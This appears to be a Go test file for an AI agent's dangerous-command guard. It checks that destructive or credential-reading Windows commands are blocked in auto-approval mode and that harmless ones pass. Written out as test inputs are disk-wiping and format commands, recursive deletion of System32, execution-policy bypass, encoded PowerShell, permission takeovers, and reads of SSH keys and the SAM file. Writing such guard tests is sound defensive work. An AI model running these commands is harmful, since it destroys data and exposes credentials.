	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Stop-Process -Id 1 to be blocked")
	}
}

// W-PS-7: Format-Volume 格式化卷
func TestGuardWindows_PSFormatVolume(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Format-Volume -DriveLetter C\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Format-Volume to be blocked")
	}
}

// W-PS-8: Clear-Disk 清除磁盘
func TestGuardWindows_PSClearDisk(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Clear-Disk -Number 0 -RemoveData\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Clear-Disk to be blocked")
	}
}

// W-PS-9: Remove-Partition 删除分区
func TestGuardWindows_PSRemovePartition(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Remove-Partition -DriveLetter D\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Remove-Partition to be blocked")
	}
}

// W-PS-10: Stop-Computer 关机
func TestGuardWindows_PSStopComputer(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Stop-Computer -Force\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Stop-Computer to be blocked")
	}
}

// W-PS-11: Restart-Computer 重启
func TestGuardWindows_PSRestartComputer(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Restart-Computer -Force\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Restart-Computer to be blocked")
	}
}

// W-PS-12: Set-ExecutionPolicy Bypass 降低执行策略
func TestGuardWindows_PSSetExecutionPolicyBypass(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Set-ExecutionPolicy Bypass -Scope Process\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Set-ExecutionPolicy Bypass to be blocked")
	}
}

// W-PS-13: Remove-ItemProperty 删除注册表属性
func TestGuardWindows_PSRemoveItemProperty(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Remove-ItemProperty -Path HKLM:\\SOFTWARE\\Test -Name Foo\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Remove-ItemProperty to be blocked")
	}
}

// W-PS-14: Clear-Item 清除注册表值
func TestGuardWindows_PSClearItem(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Clear-Item -Path HKLM:\\SOFTWARE\\Test\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Clear-Item to be blocked")
	}
}

// W-PS-15: PowerShell -enc Base64 编码命令绕过
func TestGuardWindows_PSEncodedCommand(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -enc SQBFAFgA"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected powershell -enc to be blocked")
	}
}

// W-PS-16: pwsh -encodedcommand 绕过
func TestGuardWindows_PwshEncodedCommand(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "pwsh -encodedcommand SQBFAFgA"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected pwsh -encodedcommand to be blocked")
	}
}

// ---------------------------------------------------------------------------
// Windows 平台安全命令不误拦测试
// ---------------------------------------------------------------------------

// W-Safe-1: dir 列目录不拦截
func TestGuardWindows_SafeDir(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "dir C:\\Users\\user\\Documents"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected dir to pass, got: %v", err)
	}
}

// W-Safe-2: del 删除临时文件不拦截
func TestGuardWindows_SafeDelTemp(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "del C:\\Users\\user\\AppData\\Local\\Temp\\test.tmp"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected del temp file to pass, got: %v", err)
	}
}

// W-Safe-3: echo 重定向到临时文件不拦截
func TestGuardWindows_SafeEchoRedirect(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "echo hello > C:\\Users\\user\\test.txt"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected echo > test.txt to pass, got: %v", err)
	}
}

// W-Safe-4: PowerShell 安全命令不拦截
func TestGuardWindows_SafePowerShell(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Get-Process | Select-Object -First 5\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe PowerShell to pass, got: %v", err)
	}
}

// W-Safe-5: 非 auto 模式下 Windows 破坏性命令不拦截
func TestGuardWindows_NonAutoMode(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "format C: /fs:ntfs /q"}
	cfg := internalconfig.Config{ApprovalMode: "confirm"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected no error in non-auto mode, got: %v", err)
	}
}

// W-Safe-6: taskkill 无 /f 不拦截
func TestGuardWindows_SafeTaskkillNoForce(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "taskkill /pid 1234"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected taskkill without /f to pass, got: %v", err)
	}
}

// W-Safe-7: icacls 查看权限不拦截
func TestGuardWindows_SafeIcaclsQuery(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "icacls C:\\Users\\user\\Documents"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected icacls query to pass, got: %v", err)
	}
}

// W-Safe-8: reg query 查询注册表不拦截
func TestGuardWindows_SafeRegQuery(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "reg query HKLM\\SOFTWARE\\Microsoft"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected reg query to pass, got: %v", err)
	}
}

// W-Safe-9: sc query 查询服务不拦截
func TestGuardWindows_SafeScQuery(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "sc query WinDefend"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected sc query to pass, got: %v", err)
	}
}

// W-Safe-10: net user 查看用户列表不拦截
func TestGuardWindows_SafeNetUserList(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "net user"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected net user list to pass, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// Windows 反斜杠敏感路径匹配测试
// ---------------------------------------------------------------------------

// W-Path-1: cat .ssh\id_rsa（反斜杠路径）被拦截
func TestGuardWindows_BackslashSSHPath(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "type C:\\Users\\user\\.ssh\\id_rsa"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .ssh\\id_rsa access to be blocked")
	}
}

// W-Path-2: system32\config\sam 被拦截
func TestGuardWindows_BackslashSAMPath(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "type C:\\Windows\\System32\\config\\SAM"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected system32\\config\\sam access to be blocked")
	}
}

// W-Path-3: system32\drivers\etc\hosts 被拦截
func TestGuardWindows_BackslashHostsPath(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "type C:\\Windows\\System32\\drivers\\etc\\hosts"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected system32\\drivers\\etc\\hosts access to be blocked")
	}
}

// --- 非 C 盘安装测试（Windows 不一定装在 C 盘）---

// W-Drive-1: D 盘 rmdir /s /q 递归删除用户目录
func TestGuardWindows_NonCDrive_RmdirUsers(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rmdir /s /q D:\\Users"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rmdir /s /q D:\\Users to be blocked")
	}
}

// W-Drive-2: E 盘 rmdir /s /q 递归删除系统目录
func TestGuardWindows_NonCDrive_RmdirSystem32(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rmdir /s /q E:\\Windows\\System32"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rmdir /s /q E:\\Windows\\System32 to be blocked")
	}
}

// W-Drive-3: D 盘 del /f /q 强制删除系统目录
func TestGuardWindows_NonCDrive_DelForceSystemDir(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "del /f /q D:\\Windows\\System32\\foo.dll"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected del /f D:\\Windows\\System32 to be blocked")
	}
}

// W-Drive-4: F 盘 format 格式化
func TestGuardWindows_NonCDrive_FormatF(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "format F: /fs:ntfs"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected format F: to be blocked")
	}
}

// W-Drive-5: D 盘 icacls 修改系统目录权限
func TestGuardWindows_NonCDrive_IcaclsSystemDir(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "icacls D:\\Windows\\System32 /grant Everyone:F /t"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected icacls D:\\Windows\\System32 to be blocked")
	}
}

// W-Drive-6: E 盘 takeown 递归夺取所有权
func TestGuardWindows_NonCDrive_TakeownSystemDir(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "takeown /f E:\\Windows\\System32 /r /d y"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected takeown E:\\Windows\\System32 to be blocked")
	}
}

// W-Drive-7: D 盘 PowerShell Remove-Item 递归删除系统目录
func TestGuardWindows_NonCDrive_PSRemoveItemSystemDir(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Remove-Item -Recurse -Force D:\\Windows\\System32\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Remove-Item D:\\Windows\\System32 to be blocked")
	}
}

// W-Drive-8: D 盘 PowerShell Remove-Item 递归删除用户目录
func TestGuardWindows_NonCDrive_PSRemoveItemUsers(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Remove-Item -Recurse -Force D:\\Users\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Remove-Item D:\\Users to be blocked")
	}
}

// W-Drive-9: D 盘 del 删除 .ssh 密钥
func TestGuardWindows_NonCDrive_DelSSHKey(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "del D:\\Users\\user\\.ssh\\id_rsa"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected del D:\\Users\\user\\.ssh\\id_rsa to be blocked")
	}
}

// W-Drive-10: D 盘 type 读取 SAM 文件
func TestGuardWindows_NonCDrive_TypeSAM(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "type D:\\Windows\\System32\\config\\SAM"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected type D:\\Windows\\System32\\config\\SAM to be blocked")
	}
}

// W-Drive-11: 安全命令不误拦 — D 盘 dir 列目录
func TestGuardWindows_NonCDrive_SafeDir(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "dir D:\\Users\\user\\Documents"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected dir D:\\Users\\user\\Documents to be allowed, got %v", err)
	}
}

// W-Drive-12: 安全命令不误拦 — D 盘 del 临时文件
func TestGuardWindows_NonCDrive_SafeDelTemp(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "del D:\\Users\\user\\AppData\\Local\\Temp\\test.tmp"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected del D:\\Users\\user\\AppData\\Local\\Temp\\test.tmp to be allowed, got %v", err)
	}
}

// ---------------------------------------------------------------------------
// 环境变量优先匹配测试：模拟 SystemRoot 指向非 C 盘
// ---------------------------------------------------------------------------

// W-Env-1: 模拟 SystemRoot=D:\Windows，验证 del /f D:\Windows\System32 被拦截
func TestGuardWindows_EnvVar_SystemRoot_DDrive(t *testing.T) {
	t.Setenv("SystemRoot", `D:\Windows`)
	t.Setenv("WINDIR", `D:\Windows`)
	payload := commandArguments{Mode: "shell", RawCommand: "del /f /q D:\\Windows\\System32\\foo.dll"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected del /f D:\\Windows\\System32 to be blocked via SystemRoot env var")
	}
}

// W-Env-2: 模拟 SystemRoot=E:\Windows，验证 rmdir /s E:\Windows\System32 被拦截
func TestGuardWindows_EnvVar_SystemRoot_EDrive(t *testing.T) {
	t.Setenv("SystemRoot", `E:\Windows`)
	t.Setenv("WINDIR", `E:\Windows`)
	payload := commandArguments{Mode: "shell", RawCommand: "rmdir /s /q E:\\Windows\\System32"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rmdir /s E:\\Windows\\System32 to be blocked via SystemRoot env var")
	}
}

// W-Env-3: 模拟 ProgramFiles=D:\Program Files，验证 icacls 修改权限被拦截
func TestGuardWindows_EnvVar_ProgramFiles_DDrive(t *testing.T) {
	t.Setenv("ProgramFiles", `D:\Program Files`)
	t.Setenv("ProgramFiles(x86)", `D:\Program Files (x86)`)
	payload := commandArguments{Mode: "shell", RawCommand: "icacls D:\\Program Files /grant Everyone:F /t"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected icacls D:\\Program Files to be blocked via ProgramFiles env var")
	}
}

// W-Env-4: 模拟 USERPROFILE=D:\Users\test，验证 rmdir /s D:\Users 被拦截
func TestGuardWindows_EnvVar_UserProfile_DDrive(t *testing.T) {
	t.Setenv("USERPROFILE", `D:\Users\test`)
	t.Setenv("HOMEDRIVE", "D:")
	t.Setenv("HOMEPATH", `\Users\test`)
	payload := commandArguments{Mode: "shell", RawCommand: "rmdir /s /q D:\\Users"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rmdir /s D:\\Users to be blocked via USERPROFILE env var")
	}
}

// W-Env-5: 模拟 SystemRoot=D:\Windows，验证 format D: 被拦截
func TestGuardWindows_EnvVar_Format_DDrive(t *testing.T) {
	t.Setenv("SystemRoot", `D:\Windows`)
	t.Setenv("WINDIR", `D:\Windows`)
	payload := commandArguments{Mode: "shell", RawCommand: "format D: /fs:ntfs /q"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected format D: to be blocked via SystemRoot env var")
	}
}

// W-Env-6: 模拟 SystemRoot=E:\Windows，验证 takeown /r E:\Windows 被拦截
func TestGuardWindows_EnvVar_Takeown_EDrive(t *testing.T) {
	t.Setenv("SystemRoot", `E:\Windows`)
	t.Setenv("WINDIR", `E:\Windows`)
	payload := commandArguments{Mode: "shell", RawCommand: "takeown /f E:\\Windows\\System32 /r /d y"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected takeown E:\\Windows\\System32 to be blocked via SystemRoot env var")
	}
}

// W-Env-7: 模拟 SystemRoot=D:\Windows，验证 PowerShell Remove-Item D:\Windows 被拦截
func TestGuardWindows_EnvVar_PSRemoveItem_DDrive(t *testing.T) {
	t.Setenv("SystemRoot", `D:\Windows`)
	t.Setenv("WINDIR", `D:\Windows`)
	payload := commandArguments{Mode: "shell", RawCommand: `powershell -c "Remove-Item -Recurse -Force D:\Windows\System32"`}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Remove-Item D:\\Windows\\System32 to be blocked via SystemRoot env var")
	}
}

// W-Env-8: 模拟环境变量指向 D 盘，安全命令不误拦
func TestGuardWindows_EnvVar_SafeCommand_DDrive(t *testing.T) {
	t.Setenv("SystemRoot", `D:\Windows`)
	t.Setenv("WINDIR", `D:\Windows`)
	t.Setenv("USERPROFILE", `D:\Users\test`)
	payload := commandArguments{Mode: "shell", RawCommand: "dir D:\\Users\\test\\Documents"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected dir D:\\Users\\test\\Documents to be allowed, got %v", err)
	}
}
